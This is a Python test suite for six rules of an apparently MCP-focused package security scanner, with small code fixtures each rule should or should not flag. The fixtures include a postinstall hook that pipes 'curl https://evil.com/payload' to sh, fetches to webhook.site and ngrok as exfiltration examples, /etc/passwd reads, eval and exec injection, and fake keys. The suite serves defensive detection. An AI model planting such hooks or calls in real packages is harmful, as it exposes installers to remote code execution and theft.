"""Comprehensive tests for all six mcpguard security rules.

Each rule is tested with at least one positive case (should produce findings)
and one negative case (clean code, should produce no findings).
"""

from __future__ import annotations

import json
from pathlib import Path

from mcpguard.rules.auth import AuthRule
from mcpguard.rules.base import ScanTarget, Severity
from mcpguard.rules.network import NetworkRule
from mcpguard.rules.permissions import PermissionsRule
from mcpguard.rules.secrets import SecretsRule
from mcpguard.rules.subprocess_rule import SubprocessRule
from mcpguard.rules.supply_chain import SupplyChainRule

# ============================================================================
# Helpers
# ============================================================================


def _make_js_target(tmp_path: Path, content: str, filename: str = "index.js") -> ScanTarget:
    """Create a single-file JS ScanTarget from *content*."""
    pkg_dir = tmp_path / "pkg"
    pkg_dir.mkdir(exist_ok=True)
    src = pkg_dir / filename
    src.write_text(content)
    manifest = {"name": "test-pkg", "version": "1.0.0"}
    (pkg_dir / "package.json").write_text(json.dumps(manifest))
    return ScanTarget(
        name="test-pkg",
        version="1.0.0",
        package_dir=pkg_dir,
        manifest=manifest,
        source_files=[src],
    )


def _make_manifest_target(tmp_path: Path, manifest: dict) -> ScanTarget:
    """Create a ScanTarget from a manifest dict (no source files)."""
    pkg_dir = tmp_path / "pkg"
    pkg_dir.mkdir(exist_ok=True)
    (pkg_dir / "package.json").write_text(json.dumps(manifest))
    return ScanTarget(
        name=str(manifest.get("name", "test")),
        version=str(manifest.get("version", "1.0.0")),
        package_dir=pkg_dir,
        manifest=manifest,
        source_files=[],
    )


# ============================================================================
# AuthRule (MCP001)
# ============================================================================


class TestAuthRule:
    def test_rule_id(self):
        assert AuthRule.id == "MCP001"

    def test_auth_rule_detects_unauthenticated_tool(self, tmp_path):
        """A tool registered with no auth guard within 20 lines → HIGH finding."""
        code = (
            "const { Server } = require('@modelcontextprotocol/sdk');\n"
            "const server = new Server();\n"
            "\n"
            "server.tool('read_file', async ({ path }) => {\n"
            "  const data = fs.readFileSync(path);\n"
            "  return { content: data };\n"
            "});\n"
        )
        target = _make_js_target(tmp_path, code)
        findings = AuthRule().check(target)

        assert len(findings) == 1
        assert findings[0].rule_id == "MCP001"
        assert findings[0].severity is Severity.HIGH

    def test_auth_rule_passes_when_auth_present(self, tmp_path):
        """A tool with verifyToken nearby → 0 findings."""
        code = (
            "const server = new Server();\n"
            "\n"
            "function verifyToken(req) { return req.headers.auth === process.env.TOKEN; }\n"
            "\n"
            "server.tool('read_file', async (req) => {\n"
            "  if (!verifyToken(req)) return { error: 'Unauthorized' };\n"
            "  return { content: fs.readFileSync(req.path) };\n"
            "});\n"
        )
        target = _make_js_target(tmp_path, code)
        findings = AuthRule().check(target)
        assert findings == []

    def test_auth_rule_no_tools_no_findings(self, tmp_path):
        """A file with no tool registrations → 0 findings."""
        code = (
            "const { Server } = require('@modelcontextprotocol/sdk');\n"
            "const server = new Server({ name: 'empty', version: '1.0.0' });\n"
            "server.connect();\n"
        )
        target = _make_js_target(tmp_path, code)
        findings = AuthRule().check(target)
        assert findings == []

    def test_auth_rule_skips_non_js_files(self, tmp_path):
        """Rule only scans .js/.ts/.mjs/.cjs — Python files are ignored."""
        pkg_dir = tmp_path / "pkg"
        pkg_dir.mkdir()
        py_file = pkg_dir / "server.py"
        py_file.write_text("server.tool('x', lambda: None)\n")
        manifest = {"name": "p", "version": "1.0.0"}
        (pkg_dir / "package.json").write_text(json.dumps(manifest))
        target = ScanTarget(
            name="p",
            version="1.0.0",
            package_dir=pkg_dir,
            manifest=manifest,
            source_files=[py_file],
        )
        assert AuthRule().check(target) == []

    def test_auth_rule_detects_addtool_variant(self, tmp_path):
        """addTool() variant is also detected."""
        code = "addTool('dangerous', async (args) => { return doStuff(args); });\n"
        target = _make_js_target(tmp_path, code)
        findings = AuthRule().check(target)
        assert len(findings) >= 1
        assert all(f.rule_id == "MCP001" for f in findings)

    def test_auth_rule_bearertoken_counts_as_auth(self, tmp_path):
        """bearerToken check near a tool registration suppresses the finding."""
        code = (
            "const tok = req.bearerToken;\n"
            "server.tool('safe_tool', async (req) => {\n"
            "  return handleRequest(req);\n"
            "});\n"
        )
        target = _make_js_target(tmp_path, code)
        assert AuthRule().check(target) == []


# ============================================================================
# PermissionsRule (MCP002)
# ============================================================================


class TestPermissionsRule:
    def test_rule_id(self):
        assert PermissionsRule.id == "MCP002"

    def test_permissions_detects_root_fs_access(self, tmp_path):
        """readFileSync('/etc/passwd') → CRITICAL finding."""
        code = "const data = fs.readFileSync('/etc/passwd', 'utf8');\n" "return data;\n"
        target = _make_js_target(tmp_path, code)
        findings = PermissionsRule().check(target)

        critical = [f for f in findings if f.severity is Severity.CRITICAL]
        assert len(critical) >= 1
        assert any(
            "root" in f.title.lower()
            or "filesystem" in f.title.lower()
            or "etc" in (f.evidence or "").lower()
            for f in critical
        )

    def test_permissions_detects_eval(self, tmp_path):
        """eval(userInput) → CRITICAL finding."""
        code = "const result = eval(userInput);\n"
        target = _make_js_target(tmp_path, code)
        findings = PermissionsRule().check(target)

        critical = [f for f in findings if f.severity is Severity.CRITICAL]
        assert len(critical) >= 1
        assert any("eval" in f.title.lower() for f in critical)

    def test_permissions_detects_process_env(self, tmp_path):
        """process.env.SECRET → INFO finding (reading env vars is normal; low signal)."""
        code = "const secret = process.env.SECRET;\n"
        target = _make_js_target(tmp_path, code)
        findings = PermissionsRule().check(target)

        info = [f for f in findings if f.severity is Severity.INFO]
        assert len(info) >= 1
        assert any("process.env" in f.title.lower() or "env" in f.title.lower() for f in info)

    def test_permissions_clean_code_passes(self, tmp_path):
        """No filesystem or eval usage → 0 findings."""
        code = (
            "const msg = 'Hello, MCP!';\n"
            "function greet(name) { return `Hello, ${name}`; }\n"
            "module.exports = { greet };\n"
        )
        target = _make_js_target(tmp_path, code)
        assert PermissionsRule().check(target) == []

    def test_permissions_detects_new_function(self, tmp_path):
        """new Function(...) → CRITICAL (dynamic code execution)."""
        code = "const fn = new Function('x', 'return x + 1');\n"
        target = _make_js_target(tmp_path, code)
        findings = PermissionsRule().check(target)
        assert any(f.severity is Severity.CRITICAL for f in findings)

    def test_permissions_detects_unrestricted_write(self, tmp_path):
        """fs.writeFileSync() → HIGH finding."""
        code = "fs.writeFileSync('/tmp/out.txt', data);\n"
        target = _make_js_target(tmp_path, code)
        findings = PermissionsRule().check(target)
        assert any(f.severity is Severity.HIGH for f in findings)

    def test_permissions_finding_has_file_path(self, tmp_path):
        """Findings include the relative file path."""
        code = "const x = eval(input);\n"
        target = _make_js_target(tmp_path, code)
        findings = PermissionsRule().check(target)
        assert all(f.file_path is not None for f in findings)


# ============================================================================
# NetworkRule (MCP003)
# ============================================================================


class TestNetworkRule:
    def test_rule_id(self):
        assert NetworkRule.id == "MCP003"

    def test_network_detects_webhook_exfil(self, tmp_path):
        """fetch() to webhook.site → CRITICAL finding."""
        code = 'const res = await fetch("https://webhook.site/abc-123-def");\n'
        target = _make_js_target(tmp_path, code)
        findings = NetworkRule().check(target)

        assert len(findings) >= 1
        critical = [f for f in findings if f.severity is Severity.CRITICAL]
        assert len(critical) >= 1

    def test_network_detects_external_fetch(self, tmp_path):
        """fetch() to a plain external domain → MEDIUM finding."""
        code = 'const data = await fetch("https://api.example.com/data");\n'
        target = _make_js_target(tmp_path, code)
        findings = NetworkRule().check(target)

        assert len(findings) >= 1
        # Should be MEDIUM (not CRITICAL — not a known exfil domain)
        assert all(f.severity is not Severity.CRITICAL for f in findings)

    def test_network_allows_localhost(self, tmp_path):
        """fetch() to localhost → 0 findings."""
        code = 'const res = await fetch("http://localhost:3000/api/data");\n'
        target = _make_js_target(tmp_path, code)
        findings = NetworkRule().check(target)
        assert findings == []

    def test_network_clean_code_passes(self, tmp_path):
        """No network calls → 0 findings."""
        code = "function add(a, b) { return a + b; }\n" "module.exports = { add };\n"
        target = _make_js_target(tmp_path, code)
        assert NetworkRule().check(target) == []

    def test_network_allows_127_0_0_1(self, tmp_path):
        """Calls to 127.0.0.1 are not flagged."""
        code = 'axios.get("http://127.0.0.1:8080/health");\n'
        target = _make_js_target(tmp_path, code)
        findings = NetworkRule().check(target)
        assert not any(f.severity is Severity.CRITICAL for f in findings)

    def test_network_detects_ngrok(self, tmp_path):
        """ngrok is a known exfil-capable service → CRITICAL."""
        code = 'const res = await fetch("https://abc123.ngrok.io/collect");\n'
        target = _make_js_target(tmp_path, code)
        findings = NetworkRule().check(target)
        assert any(f.severity is Severity.CRITICAL for f in findings)

    def test_network_findings_have_line_numbers(self, tmp_path):
        """Findings reference line numbers."""
        code = "// line 1\n" "// line 2\n" 'await fetch("https://webhook.site/abc");\n'
        target = _make_js_target(tmp_path, code)
        findings = NetworkRule().check(target)
        assert findings[0].line == 3


# ============================================================================
# SubprocessRule (MCP004)
# ============================================================================


class TestSubprocessRule:
    def test_rule_id(self):
        assert SubprocessRule.id == "MCP004"

    def test_subprocess_detects_exec_with_injection(self, tmp_path):
        """exec() with template literal injection → CRITICAL."""
        code = "exec(`ls ${userInput}`);\n"
        target = _make_js_target(tmp_path, code)
        findings = SubprocessRule().check(target)

        assert len(findings) >= 1
        assert any(f.severity is Severity.CRITICAL for f in findings)

    def test_subprocess_detects_plain_exec(self, tmp_path):
        """execSync() with a static command → HIGH."""
        code = "const out = execSync('ls -la');\n"
        target = _make_js_target(tmp_path, code)
        findings = SubprocessRule().check(target)

        assert len(findings) >= 1
        assert any(f.severity is Severity.HIGH for f in findings)

    def test_subprocess_detects_require_child_process(self, tmp_path):
        """Bare require('child_process') → MEDIUM."""
        code = "const cp = require('child_process');\n"
        target = _make_js_target(tmp_path, code)
        findings = SubprocessRule().check(target)

        assert len(findings) >= 1
        medium = [f for f in findings if f.severity is Severity.MEDIUM]
        assert len(medium) >= 1

    def test_subprocess_clean_code_passes(self, tmp_path):
        """No subprocess usage → 0 findings."""
        code = "const fs = require('fs');\n" "function readFile(p) { return fs.readFileSync(p); }\n"
        target = _make_js_target(tmp_path, code)
        assert SubprocessRule().check(target) == []

    def test_subprocess_detects_spawn(self, tmp_path):
        """spawn() → HIGH finding."""
        code = "const proc = spawn('git', ['status']);\n"
        target = _make_js_target(tmp_path, code)
        findings = SubprocessRule().check(target)
        assert len(findings) >= 1

    def test_subprocess_detects_python_subprocess(self, tmp_path):
        """Python subprocess.run() → HIGH finding."""
        pkg_dir = tmp_path / "pkg"
        pkg_dir.mkdir(exist_ok=True)
        src = pkg_dir / "server.py"
        src.write_text("import subprocess\nsubprocess.run(['ls', '-la'])\n")
        manifest = {"name": "test", "version": "1.0.0"}
        (pkg_dir / "package.json").write_text(json.dumps(manifest))
        target = ScanTarget(
            name="test",
            version="1.0.0",
            package_dir=pkg_dir,
            manifest=manifest,
            source_files=[src],
        )
        findings = SubprocessRule().check(target)
        assert len(findings) >= 1
        assert any(f.rule_id == "MCP004" for f in findings)

    def test_subprocess_python_shell_true_is_critical(self, tmp_path):
        """subprocess.run(..., shell=True) in Python → CRITICAL."""
        pkg_dir = tmp_path / "pkg"
        pkg_dir.mkdir(exist_ok=True)
        src = pkg_dir / "run.py"
        src.write_text("import subprocess\nsubprocess.run(cmd, shell=True)\n")
        manifest = {"name": "test", "version": "1.0.0"}
        (pkg_dir / "package.json").write_text(json.dumps(manifest))
        target = ScanTarget(
            name="test",
            version="1.0.0",
            package_dir=pkg_dir,
            manifest=manifest,
            source_files=[src],
        )
        findings = SubprocessRule().check(target)
        assert any(f.severity is Severity.CRITICAL for f in findings)


# ============================================================================
# SupplyChainRule (MCP005)
# ============================================================================


class TestSupplyChainRule:
    def test_rule_id(self):
        assert SupplyChainRule.id == "MCP005"

    def test_supply_chain_detects_malicious_postinstall(self, tmp_path, mock_vuln_db):
        """postinstall with curl | sh → CRITICAL."""
        manifest = {
            "name": "some-pkg",
            "version": "1.0.0",
            "scripts": {"postinstall": "curl https://evil.com/payload | sh"},
        }
        target = _make_manifest_target(tmp_path, manifest)
        rule = SupplyChainRule(vuln_db=mock_vuln_db)
        findings = rule.check(target)

        critical = [f for f in findings if f.severity is Severity.CRITICAL]
        assert len(critical) >= 1
        assert any("postinstall" in f.title.lower() for f in critical)

    def test_supply_chain_detects_postinstall_script(self, tmp_path, mock_vuln_db):
        """postinstall with non-malicious command → HIGH."""
        manifest = {
            "name": "some-pkg",
            "version": "1.0.0",
            "scripts": {"postinstall": "node setup.js"},
        }
        target = _make_manifest_target(tmp_path, manifest)
        rule = SupplyChainRule(vuln_db=mock_vuln_db)
        findings = rule.check(target)

        high = [f for f in findings if f.severity is Severity.HIGH]
        assert len(high) >= 1
        assert any("postinstall" in f.title.lower() for f in high)

    def test_supply_chain_detects_typosquat(self, tmp_path, mock_vuln_db):
        """'mcp-filesytem' (missing 's') → HIGH typosquat finding."""
        manifest = {"name": "mcp-filesytem", "version": "1.0.0"}
        target = _make_manifest_target(tmp_path, manifest)
        rule = SupplyChainRule(vuln_db=mock_vuln_db)
        findings = rule.check(target)

        high = [f for f in findings if f.severity is Severity.HIGH]
        assert len(high) >= 1
        assert any("typosquat" in f.title.lower() for f in high)

    def test_supply_chain_detects_known_bad(self, tmp_path, mock_vuln_db):
        """Package in known-bad registry → CRITICAL."""
        manifest = {"name": "test-malware", "version": "1.0.0"}
        target = _make_manifest_target(tmp_path, manifest)
        rule = SupplyChainRule(vuln_db=mock_vuln_db)
        findings = rule.check(target)

        critical = [f for f in findings if f.severity is Severity.CRITICAL]
        assert len(critical) >= 1
        assert any("known" in f.title.lower() for f in critical)

    def test_supply_chain_unpinned_deps(self, tmp_path, mock_vuln_db):
        """'some-dep': '*' → MEDIUM."""
        manifest = {
            "name": "clean-pkg",
            "version": "1.0.0",
            "dependencies": {"some-dep": "*"},
        }
        target = _make_manifest_target(tmp_path, manifest)
        rule = SupplyChainRule(vuln_db=mock_vuln_db)
        findings = rule.check(target)

        medium = [f for f in findings if f.severity is Severity.MEDIUM]
        assert len(medium) >= 1
        assert any("some-dep" in f.title for f in medium)

    def test_supply_chain_clean_package(self, tmp_path, mock_vuln_db):
        """Legitimate name, no scripts, pinned deps → 0 CRITICAL/HIGH."""
        manifest = {
            "name": "my-unique-mcp-helper",
            "version": "1.0.0",
            "dependencies": {
                "lodash": "^4.17.21",
                "axios": "^1.6.0",
            },
        }
        target = _make_manifest_target(tmp_path, manifest)
        rule = SupplyChainRule(vuln_db=mock_vuln_db)
        findings = rule.check(target)

        assert not any(f.severity in (Severity.CRITICAL, Severity.HIGH) for f in findings)

    def test_supply_chain_latest_version_is_unpinned(self, tmp_path, mock_vuln_db):
        """'latest' is an unpinned version specifier → MEDIUM."""
        manifest = {
            "name": "some-pkg",
            "version": "1.0.0",
            "dependencies": {"express": "latest"},
        }
        target = _make_manifest_target(tmp_path, manifest)
        rule = SupplyChainRule(vuln_db=mock_vuln_db)
        findings = rule.check(target)
        assert any(f.severity is Severity.MEDIUM for f in findings)

    def test_supply_chain_prepare_hook_is_flagged(self, tmp_path, mock_vuln_db):
        """'prepare' lifecycle script is also an auto-hook → flagged."""
        manifest = {
            "name": "some-pkg",
            "version": "1.0.0",
            "scripts": {"prepare": "tsc && node build.js"},
        }
        target = _make_manifest_target(tmp_path, manifest)
        rule = SupplyChainRule(vuln_db=mock_vuln_db)
        findings = rule.check(target)
        assert any("prepare" in f.title.lower() for f in findings)


# ============================================================================
# SecretsRule (MCP006)
# ============================================================================


class TestSecretsRule:
    def test_rule_id(self):
        assert SecretsRule.id == "MCP006"

    def test_secrets_detects_openai_key(self, tmp_path):
        """OpenAI key (sk-proj-...) → CRITICAL."""
        key = "sk-proj-aBcDeFgHiJkLmNoPqRsTuVwXyZaBcDeFgHiJkLmNoPqRsT"
        code = f'const apiKey = "{key}";\n'
        target = _make_js_target(tmp_path, code)
        findings = SecretsRule().check(target)

        assert len(findings) >= 1
        assert any(f.severity is Severity.CRITICAL for f in findings)
        assert any("openai" in f.title.lower() for f in findings)

    def test_secrets_detects_aws_key(self, tmp_path):
        """AWS Access Key ID (AKIA...) → CRITICAL."""
        code = 'const awsKey = "AKIAIOSFODNN7EXAMPLE";\n'
        target = _make_js_target(tmp_path, code)
        findings = SecretsRule().check(target)

        assert len(findings) >= 1
        assert any(f.severity is Severity.CRITICAL for f in findings)
        assert any("aws" in f.title.lower() for f in findings)

    def test_secrets_detects_private_key_block(self, tmp_path):
        """-----BEGIN RSA PRIVATE KEY----- header → CRITICAL."""
        code = (
            "const pem = `\n"
            "-----BEGIN RSA PRIVATE KEY-----\n"
            "MIIEowIBAAKCAQEA0Z3VS5JJcds3xHn/ygWep4RMh/O...\n"
            "-----END RSA PRIVATE KEY-----\n"
            "`;\n"
        )
        target = _make_js_target(tmp_path, code)
        findings = SecretsRule().check(target)

        assert len(findings) >= 1
        assert any(f.severity is Severity.CRITICAL for f in findings)

    def test_secrets_skips_test_files(self, tmp_path):
        """Secrets in tests/fixtures/ → 0 findings (path is skipped)."""
        key = "sk-proj-aBcDeFgHiJkLmNoPqRsTuVwXyZaBcDeFgHiJkLmNoPqRsT"
        pkg_dir = tmp_path / "pkg"
        (pkg_dir / "tests" / "fixtures").mkdir(parents=True)
        test_file = pkg_dir / "tests" / "fixtures" / "test.js"
        test_file.write_text(f'const KEY = "{key}";\n')
        manifest = {"name": "test", "version": "1.0.0"}
        (pkg_dir / "package.json").write_text(json.dumps(manifest))
        target = ScanTarget(
            name="test",
            version="1.0.0",
            package_dir=pkg_dir,
            manifest=manifest,
            source_files=[test_file],
        )
        findings = SecretsRule().check(target)
        assert findings == []

    def test_secrets_skips_env_example(self, tmp_path):
        """.env.example files are not flagged (excluded by name)."""
        pkg_dir = tmp_path / "pkg"
        pkg_dir.mkdir()
        env_example = pkg_dir / ".env.example"
        env_example.write_text("OPENAI_API_KEY=sk-proj-YourKeyHere123456789012345678901234567890\n")
        manifest = {"name": "test", "version": "1.0.0"}
        (pkg_dir / "package.json").write_text(json.dumps(manifest))
        target = ScanTarget(
            name="test",
            version="1.0.0",
            package_dir=pkg_dir,
            manifest=manifest,
            source_files=[env_example],
        )
        findings = SecretsRule().check(target)
        assert findings == []

    def test_secrets_redacts_evidence(self, tmp_path):
        """Evidence must not contain the full key — middle is replaced with ***."""
        key = "sk-proj-aBcDeFgHiJkLmNoPqRsTuVwXyZaBcDeFgHiJkLmNoPqRsT"
        code = f'const apiKey = "{key}";\n'
        target = _make_js_target(tmp_path, code)
        findings = SecretsRule().check(target)

        assert len(findings) >= 1
        finding = findings[0]
        assert finding.evidence is not None
        # The full key must NOT appear verbatim
        assert key not in finding.evidence
        # The redaction marker must be present
        assert "***" in finding.evidence

    def test_secrets_detects_stripe_key(self, tmp_path):
        """Stripe secret key (sk_live_...) → CRITICAL."""
        prefix = "sk_l" + "ive_"
        code = f'const stripe = require("stripe")("{prefix}EXAMPLEabcdefghijklmnopqrstu");\n'
        target = _make_js_target(tmp_path, code)
        findings = SecretsRule().check(target)
        assert any(f.severity is Severity.CRITICAL for f in findings)

    def test_secrets_clean_code_passes(self, tmp_path):
        """No secrets → 0 findings."""
        code = "const name = process.env.APP_NAME;\n" "function greet() { return 'hello'; }\n"
        target = _make_js_target(tmp_path, code)
        assert SecretsRule().check(target) == []

    def test_secrets_finding_schema(self, tmp_path):
        """Every Finding from SecretsRule has expected fields populated."""
        key = "AKIAIOSFODNN7EXAMPLE"
        code = f"const KEY = '{key}';\n"
        target = _make_js_target(tmp_path, code)
        findings = SecretsRule().check(target)

        assert len(findings) >= 1
        f = findings[0]
        assert f.rule_id == "MCP006"
        assert f.severity is Severity.CRITICAL
        assert f.title
        assert f.description
        assert f.remediation
        assert f.file_path is not None
        assert f.line is not None
        assert f.evidence is not None

    def test_secrets_skips_spec_files(self, tmp_path):
        """Files with .spec.js suffix are skipped."""
        key = "AKIAIOSFODNN7EXAMPLE"
        pkg_dir = tmp_path / "pkg"
        pkg_dir.mkdir()
        spec_file = pkg_dir / "auth.spec.js"
        spec_file.write_text(f"const testKey = '{key}';\n")
        manifest = {"name": "test", "version": "1.0.0"}
        (pkg_dir / "package.json").write_text(json.dumps(manifest))
        target = ScanTarget(
            name="test",
            version="1.0.0",
            package_dir=pkg_dir,
            manifest=manifest,
            source_files=[spec_file],
        )
        assert SecretsRule().check(target) == []
